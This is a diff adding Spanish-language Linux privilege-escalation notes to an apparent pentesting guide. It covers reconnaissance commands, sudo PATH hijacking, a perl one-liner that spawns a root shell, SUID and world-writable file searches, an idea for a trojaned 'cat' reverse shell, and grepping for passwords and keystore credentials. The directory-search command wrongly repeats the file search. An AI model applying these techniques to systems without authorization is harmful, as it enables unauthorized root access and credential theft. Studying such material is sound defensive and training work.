@@ -58,12 +58,130 @@ En windows es similar los conceptos generales, pero ya la forma de realizarlo ca
 ## Discovery:
 Siempre es bueno revisar en lo general el estado, con el tiempo sabras identificar que malas practicas podria tener el SO más rapido.
 
-### Uses Full Commands:
+### Reconocimiento general:
+Primero siempre es bueno reconocer el panorama general:
+```
+ps -ef : Tabla de procesos con el respectivo ID
+```
+```
+mount -l : Muestra los dispositivos (/dev) o archivos montados en carpetas del sistemas
+```
+```
+route -n : Tabla de ruteo
+/sbin/ifconfig -a : All ifconfig
+cat /etc/crontab o ls -la /etc/cron.d o crontab -l : Mostrar los cron que esta corrriendo
+cat /etc/exports : Archivos exportables a NFS
+cat /etc/redhat* /etc/debian* /etc/*release : version de OS
+ls /etc/rc* : Lista inicios de Bootup
+egrep -e '/bin/(ba)?sh' /etc/passwd : Usuarios con shell
+cat ~/.ssh/ : buscar las key de ssh
+```
+
+### Abusar de caracteristicas especiales:
+Hay ciertas configuraciones en linux que pueden ser abusadas.
+
+#### SUDO -L
+Nos regresara los permisos que tenemos para correr binarios con permisos de sudo, es un resultado similar a:
+```
+> sudo -l
+  User kali may run the following commands on kali:
+    (ALL : ALL) ALL (Podemos correr cualquier comando con sudo pero nos pedira password, usualmente para usuarios de admin)
+    (kali : docker) NOPASSWD: /usr/bin/kaboxer (no nos pedira password para correr este comando)
+```
+Cuando un binario esta asignado con sudo hay dos formas basicas de abusar de el:
+  
+1 - Ruta mal implementada: 
+  Un binario que este sin una ruta completa puede abusarse de borrar el valor de PATH (variable usada para almacenar donde se localizan los binarios), por ejemplo:
+```
+> sudo -l
+  User kali may run the following commands on kali:
+    (kali : docker) NOPASSWD: kaboxer
+> echo $PATH           
+  /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+> sudo kaboxer (probara con las rutas anteriores de derecha a izquiera buscando al binario)
+> export PATH=/tmp:$PATH (agregaremos la carpeta tmp para que primero busque ahí a un falso binario)
+> sudo kaboxer (ejecutara /tmp/kaboxer)
+```
+2 - Abusar de la naturaleza del binario:
+   Este es el más facil de abusar, por ejemplo sí tenemos a "cat" puedes simplemente abusar para leer archivos sensibles como shadow, pero.. hay otros que permiten ejecutar una shell, para esto simplemente apoyate de este buscador:
+
+- https://gtfobins.github.io/
+
+Por ejemplo, sí tienes a el binario de perl simplemente ejecuta:
+```
+> perl -e 'exec "/bin/sh";'
+> whoami
+  root
+```
+3 - Abusar de metodo interno:
+  Sí tiene una ruta completa, y es un binario o sh debemos ver internamente sus metodos para buscar sí alguno puede ser suceptible a inyectarle codigo.
+```
+> sudo imprimir.sh
+```
+Por ejemplo sí el anterior archivo tiene un metodo que manda a ejecutar un cat para leer archivos pdf recientes de un server web basado en una variable de entorno del path donde estan los pdf, puedes borrar el valor de la variable local o dejarla vacia y subir un archivo pdf con el nombre /etc/passwd, asi leeras los archivos que quieras.
+
+Esto puede variar mucho y tendras que usar mucho tu logica.
+
+### SUID:
+Los SUID son identificadores que permiten ejecutar binarios con permisos del owner, sin necesidad de sudo o contraseña del dueño, en casos donde el owner es otro usuario o root, podriamos ejecutarlo y elevar privilegios
+
+Buscar archivos SUID:
+```
+>find / -perm -3000 -ls 2> /dev/null
+>/usr/bin/whoami
+>ls -l /usr/bin/whoami
+.rwsr-xr-x root root datetime /usr/bin/whoami
+```
+Por ejemplo, sí el binario whoami tiene permisos de ejecutarse con SUID (lo notaras por el s en vez de una x), al ejecutarlo veremos que el usuario es root y no el usuario con el que estamos usando la CLI.
+
+NOTA: SUID solo funciona en binarios, no en scripts.
+
+#### World-Writable files and directories:
+Sí tenemos archivos que tengan permisos write por todo el mundo por ejemplo de otro usuario o root, podemos ver sí es un archivo que se ejecute por cron con permisos de root, o que se ejecute constamente por otro usuario, por ejemplo sí el archivo cat es escribible podemos modificarlo y esperar a que mediante otra sesión el usuario real ejecute cat y recibir una reverse shell.
+
+Archivos:
+```
+> find / -path /sys -prune -o -path /proc -prune -o -type f -perm -o=w -ls 2> /dev/null
+```
+Directorios:
+```
+> find / -path /sys -prune -o -path /proc -prune -o -type f -perm -o=w -ls 2> /dev/null
+```
+
+#### Buscar archivos con contraseñas:
+Basicamente buscar contraseñas en archivos legibles, como archivos de configuración o por mala practica guardar contraseñas localmente.
+Hay muchas formas, necesitaras aplicar logica a la busqueda, siempre recomiendo que en base a servicios o framework busques donde se almacenan en especifico, por sino puede ser tedioso, por ejemplo WPress usualmente guarda los accesos en wp-config.php
+
+Sino puedes hacer barrido en base al nombre del archivo:
+```
+> find / -name "*.txt" -ls 2> /dev/null
+> find / -name "pass*.txt" -ls 2> /dev/null
+```
+O en base a su contenido:
+```
+> grep -riI 'password' /path
+> grep -riI 'pass=' /path
+> grep -riI 'pass:' /path
+> grep -riI 'user' /path
+...
+```
+##### Archivos keystore.jks
+Archivos de almacenamiento para llaves publicas y privadas o contraseñas, por ejemplo, kafka puede usa este tipo de archivos:
 
 ```
-- > sudo -l
-  - 
-find / -perm -3000 -ls 2> /dev/null
+> find / -name "pass*.txt" -ls 2> /dev/null
+  3159787      4 -r--r--r--   1 kali     kali         1238 Apr 17 16:25 /home/kali/go/pkg/mod/github.com/fgeller/kt/v14@v14.0.0-pre/test-secrets/kafka.broker1.truststore.jks
+  3159786      8 -r--r--r--   1 kali     kali         4554 Apr 17 16:25 /home/kali/go/pkg/mod/github.com/fgeller/kt/v14@v14.0.0-pre/test-secrets/kafka.broker1.keystore.jks
+
+> ls /home/kali/go/pkg/mod/github.com/fgeller/kt/v14@v14.0.0-pre/test-secrets
+...
+broker1_keystore_creds (contraseña del jks)
+...
+> cat /home/kali/go/pkg/mod/github.com/fgeller/kt/v14@v14.0.0-pre/test-secrets/broker1_keystore_creds
+testing
+> keytool -list -v -keystore /home/kali/go/pkg/mod/github.com/fgeller/kt/v14@v14.0.0-pre/test-secrets/kafka.broker1.keystore.jks
+  Introduce la contraseña: testing
+... Contenido del jks
 ```
 
 ### Falta parcheo:
